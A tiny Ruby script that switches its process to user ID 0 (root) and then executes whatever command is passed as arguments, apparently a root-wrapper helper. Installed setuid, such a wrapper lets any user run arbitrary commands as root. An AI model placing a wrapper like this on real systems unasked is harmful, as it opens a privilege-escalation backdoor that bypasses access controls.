#!/usr/bin/env ruby
Process::UID.change_privilege(0)
exec(*ARGV)
